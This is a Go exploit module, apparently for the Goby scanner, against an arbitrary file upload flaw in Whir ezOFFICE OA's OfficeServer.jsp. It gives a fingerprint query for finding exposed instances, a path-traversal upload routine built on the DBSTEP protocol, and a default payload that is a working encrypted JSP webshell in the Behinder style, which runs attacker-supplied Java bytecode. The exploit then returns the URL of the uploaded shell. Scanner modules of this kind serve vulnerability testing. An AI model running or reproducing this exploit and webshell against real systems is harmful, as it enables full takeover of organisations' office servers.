package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ezOFFICE OA OfficeServer.jsp Arbitrarily File Upload Vulnerability",
    "Description": "<p>ezOFFICE OA is a FlexOffice independent security cooperative office platform for government organizations, enterprises and institutions.</p><p>ezOFFICE OA OfficeServer There is an arbitrary file upload vulnerability in jsp, through which an attacker can upload arbitrary files to control the entire server.</p>",
    "Product": "Whir-ezOFFICE",
    "Homepage": "https://www.whir.net/",
    "DisclosureDate": "2022-06-17",
    "Author": "heiyeleng",
    "FofaQuery": "(banner=\"OASESSIONID\" && banner=\"/defaultroot/\") || (header=\"OASESSIONID\" && header=\"/defaultroot/\")||body=\"/defaultroot/themes/common/common.css\"||body=\"ezofficeDomainAccount\"||title=\"Wanhu ezOFFICE\" || title=\"万户ezOFFICE\"",
    "GobyQuery": "(banner=\"OASESSIONID\" && banner=\"/defaultroot/\") || (header=\"OASESSIONID\" && header=\"/defaultroot/\")||body=\"/defaultroot/themes/common/common.css\"||body=\"ezofficeDomainAccount\"||title=\"Wanhu ezOFFICE\" || title=\"万户ezOFFICE\"",
    "Level": "3",
    "Impact": "<p>File upload vulnerabilities are usually caused by the lax filtering of files uploaded by the file upload function in the code or the unrepaired parsing vulnerabilities related to the web server. Attackers can upload arbitrary files through the file upload point, including the website backdoor file (webshell), to control the entire website.</p>",
    "Recommendation": "<p>1. Strictly limit and verify the uploaded files, and prohibit the uploading of malicious code files.</p><p>2. Please pay attention to the vendor bug patch announcement: <a href=\"https://www.whir.net/\">https://www.whir.net/</a>.</p>",
    "References": [
        "https://fofa.info/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "fileName",
            "type": "input",
            "value": "gotest",
            "show": ""
        },
        {
            "name": "fileContent",
            "type": "input",
            "value": "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "万户 OA OfficeServer.jsp 任意文件上传漏洞",
            "Product": "万户网络-ezOFFICE",
            "Description": "<p>万户OA是面向政府组织及企事业单位的FlexOffice自主安全协同办公平台。<br></p><p>万户OA OfficeServer.jsp存在任意文件上传漏洞，攻击者可通过该漏洞上传任意文件从而控制整个服务器。<br></p>",
            "Recommendation": "<p>1、严格限制和校验上传的文件，禁止上传恶意代码的文件。</p><p>2、请关注厂商漏洞补丁公告：<a href=\"https://www.whir.net/\" target=\"_blank\">https://www.whir.net/</a>。</p>",
            "Impact": "<p>文件上传漏洞通常由于代码中对文件上传功能所上传的文件过滤不严或web服务器相关解析漏洞未修复而造成的，攻击者可通过文件上传点上传任意文件，包括网站后门文件（webshell）控制整个网站。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "ezOFFICE OA OfficeServer.jsp Arbitrarily File Upload Vulnerability",
            "Product": "Whir-ezOFFICE",
            "Description": "<p>ezOFFICE&nbsp;OA is a FlexOffice independent security cooperative office platform for government organizations, enterprises and institutions.</p><p>ezOFFICE&nbsp;OA&nbsp;OfficeServer&nbsp;There is an arbitrary file upload vulnerability in jsp, through which an attacker can upload arbitrary files to control the entire server.<br></p>",
            "Recommendation": "<p>1. Strictly limit and verify the uploaded files, and prohibit the uploading of malicious code files.</p><p>2. Please pay attention to the vendor bug patch announcement: <a href=\"https://www.whir.net/\" target=\"_blank\">https://www.whir.net/</a>.</p>",
            "Impact": "<p>File upload vulnerabilities are usually caused by the lax filtering of files uploaded by the file upload function in the code or the unrepaired parsing vulnerabilities related to the web server. Attackers can upload arbitrary files through the file upload point, including the website backdoor file (webshell), to control the entire website.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "7384"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/defaultroot/public/iWebOfficeSign/OfficeServer.jsp"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false

			fileName := goutils.RandomHexString(6)
			fileNameb64 := base64.StdEncoding.EncodeToString([]byte("//../../public/edit/" + fileName + ".jsp"))

			randStr := goutils.RandomHexString(6)
			fileContent := "<% out.println(\"" + randStr + "\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>"
			// 拼接body部分
			body := "DBSTEP=REJTVEVQ\r\nOPTION=U0FWRUZJTEU=\r\nRECORDID=\r\nisDoc=dHJ1ZQ==\r\nmoduleType=Z292ZG9jdW1lbnQ=\r\nFILETYPE=" + fileNameb64 + "\r\n"
			// 计算body长度
			bodyLen := strconv.Itoa(len(body))
			// 计算payload长度
			payloadLen := strconv.Itoa(len(fileContent))

			data1 := fmt.Sprintf("%-16s", "DBSTEP V3.0")
			data2 := fmt.Sprintf("%-16s", bodyLen)
			data3 := fmt.Sprintf("%-16d", 0)
			data4 := fmt.Sprintf("%-16s", payloadLen)

			cfg.Data = data1 + data2 + data3 + data4 + body + fileContent
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "DBSTEP V3.0") {
					uri1 := "/defaultroot/public/edit/" + fileName + ".jsp"
					cfg1 := httpclient.NewGetRequestConfig(uri1)
					cfg1.VerifyTls = false
					cfg1.FollowRedirect = false
					if resp, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
						return resp.StatusCode == 200 && strings.Contains(resp.RawBody, randStr)
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			fileName := ss.Params["fileName"].(string)
			fileContent := ss.Params["fileContent"].(string)
			fileNameb64 := base64.StdEncoding.EncodeToString([]byte("//../../public/edit/" + fileName + ".jsp"))
			uri := "/defaultroot/public/iWebOfficeSign/OfficeServer.jsp"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			// 拼接body部分
			body := "DBSTEP=REJTVEVQ\r\nOPTION=U0FWRUZJTEU=\r\nRECORDID=\r\nisDoc=dHJ1ZQ==\r\nmoduleType=Z292ZG9jdW1lbnQ=\r\nFILETYPE=" + fileNameb64 + "\r\n"
			// 计算body长度
			bodyLen := strconv.Itoa(len(body))
			// 计算payload长度
			payloadLen := strconv.Itoa(len(fileContent))

			data1 := fmt.Sprintf("%-16s", "DBSTEP V3.0")
			data2 := fmt.Sprintf("%-16s", bodyLen)
			data3 := fmt.Sprintf("%-16d", 0)
			data4 := fmt.Sprintf("%-16s", payloadLen)

			cfg.Data = data1 + data2 + data3 + data4 + body + fileContent
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "DBSTEP V3.0") {
					uri1 := "/defaultroot/public/edit/" + fileName + ".jsp"
					cfg1 := httpclient.NewGetRequestConfig(uri1)
					cfg1.VerifyTls = false
					cfg1.FollowRedirect = false
					if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
						if resp.StatusCode == 200 {
							expResult.Output = "文件上传成功，请访问路径：" + expResult.HostInfo.FixedHostInfo + uri1
							expResult.Success = true
						}
					}
				}
			}
			return expResult
		},
	))
}
